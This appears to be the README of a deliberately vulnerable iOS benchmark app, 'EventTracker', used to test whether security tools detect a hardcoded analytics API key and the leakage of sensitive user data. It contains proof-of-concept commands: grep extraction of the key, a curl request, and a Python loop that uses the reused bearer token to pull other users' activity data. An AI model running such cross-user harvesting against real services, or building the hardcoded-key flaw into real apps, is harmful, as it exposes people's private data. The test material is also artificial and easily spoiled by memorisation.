# oxo-ios-ben8 EventTracker - iOS leak information to 3rd party

## Challenge Details

### Description
A modern productivity and habit tracking application for iOS, "EventTracker," allows users to log daily activities across various categories including work, exercise, meals, and social events. The application features a clean SwiftUI interface with cloud synchronization capabilities for personalized insights and recommendations. However, the analytics integration contains a critical privacy vulnerability that exposes sensitive user data to third-party services through API key reuse and excessive data collection. Can your tool identify the hardcoded credentials and detect the unauthorized cross-user data access?

### Vulnerability Type and Category
- **Type:** Privacy Violation - Information Disclosure to Third Party
- **Category:** Sensitive Data Exposure

### Weakness (CWE)
- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-798:** Use of Hard-coded Credentials

### Platform
iOS (Swift/SwiftUI)

### Difficulty
Medium

## Vulnerability Overview
The application's `AnalyticsService` class transmits comprehensive user activity data to a third-party analytics service using a hardcoded API key that can be extracted and reused to access other users' sensitive information. While the app appears to provide legitimate productivity insights, it collects and transmits excessive personal data including activity notes, location information, device fingerprints, and behavioral patterns without proper access controls. This design flaw enables attackers to intercept the API key and gain unauthorized access to any user's private activity data.

**Key Vulnerability Points:**
- Hardcoded API key in application bundle
- Reusable authentication token across all users
- Excessive personal data collection and transmission
- HTTP transmission of sensitive information
- Predictable user identifier generation
- No per-user API key isolation

## Real-World Context
This vulnerability mirrors the actual security issue discovered in the Nord Security iOS application (HackerOne Report #752402), where application event data was exposed through the reuse of API keys. The vulnerability was classified as Critical severity and demonstrates how mobile applications can leak sensitive user information to third-party services when proper access controls are not implemented.

## Exploitation Vector
1. **Network Interception:** An attacker monitors network traffic from the EventTracker application during normal usage.
2. **API Key Extraction:** The hardcoded API key is extracted from HTTP headers or through static analysis of the application binary.
3. **Cross-User Access:** Using the same API key, the attacker queries the third-party service to access other users' activity data.
4. **Data Harvesting:** Sensitive personal information including activity patterns, location data, and device information is collected from multiple users.

## Proof of Concept Exploitation

### 1. Network Traffic Analysis
Monitor HTTP requests during app usage:
```bash
# Expected network traffic pattern
POST http://httpbin.org/post
Authorization: Bearer ak_live_1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p
Content-Type: application/json

{
  "user_id": "user_12345678",
  "event_type": "activity_logged",
  "data": {
    "activity_title": "Private therapy session",
    "notes": "Discussed personal anxiety issues",
    "location": "Downtown Medical Center",
    "device_info": {
      "name": "John's iPhone",
      "identifier": "A1B2C3D4-E5F6-7890-ABCD-EF1234567890"
    }
  }
}
```

### 2. API Key Extraction
Extract the hardcoded API key from the application:
```bash
# Static analysis approach
strings EventTracker.app/EventTracker | grep "ak_live"
# Result: ak_live_1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p
```

### 3. Cross-User Data Access
Use the extracted API key to access other users' data:
```bash
# Unauthorized access to other users' activities
curl -H "Authorization: Bearer ak_live_1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p" \
     "http://analytics-api.eventtracker.com/v1/users/user_abc12345/activities"
```

### 4. Comprehensive Data Harvesting
Enumerate and collect data from multiple users:
```python
import requests

api_key = "ak_live_1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p"
headers = {"Authorization": f"Bearer {api_key}"}

# Access multiple users' sensitive data
user_ids = ["user_abc12345", "user_def67890", "user_ghi11223"]
for user_id in user_ids:
    response = requests.get(
        f"http://analytics-api.eventtracker.com/v1/users/{user_id}/activities",
        headers=headers
    )
    print(f"Accessed {user_id}: {response.status_code}")
```

## Build Instructions
This is a standard Xcode project built with SwiftUI for iOS 15.0+.

### Prerequisites
- Xcode 14.0 or later
- iOS 15.0+ Simulator or physical device
- macOS 12.0+ for development

### Building and Running
1. Open `EventTracker.xcodeproj` in Xcode
2. Select your target device (Simulator or physical device)
3. Build and run the project (`Cmd + R`)
4. The app will automatically attempt to sync activity data to the analytics service

## Testing the Vulnerability

### Step-by-Step Exploitation
1. **Launch EventTracker** in iOS Simulator or on a device
2. **Add new activities** by tapping the "+" button and creating various activity entries
3. **Monitor network traffic** using a proxy tool (Charles, Burp Suite, or mitmproxy)
4. **Extract the API key** from the Authorization header in HTTP requests
5. **Test cross-user access** by using the same API key with different user IDs
6. **Observe data leakage** in the transmitted JSON payloads

### Expected Results
- ✅ Hardcoded API key is transmitted in HTTP headers
- ✅ Sensitive personal data (notes, location, device info) is exposed
- ✅ Same API key provides access to other users' data
- ✅ No authentication or authorization controls are enforced
- ✅ Device fingerprinting and behavioral tracking is enabled

### Network Monitoring Setup
To capture the vulnerability in action:

1. **Configure HTTP Proxy:**
   ```bash
   # Using mitmproxy
   mitmproxy -p 8080 --set confdir=~/.mitmproxy
   ```

2. **Configure iOS Simulator:**
   - Settings → Wi-Fi → Configure Proxy → Manual
   - Server: 127.0.0.1, Port: 8080

3. **Monitor Traffic:**
   - Launch EventTracker
   - Add activities and observe HTTP requests
   - Extract API key from Authorization headers

### Vulnerability Indicators
Security tools should detect:
- **Static Analysis:** Hardcoded API key in `AnalyticsService.swift`
- **Dynamic Analysis:** HTTP requests with sensitive data transmission
- **Network Analysis:** Reusable authentication tokens
- **Privacy Analysis:** Excessive data collection patterns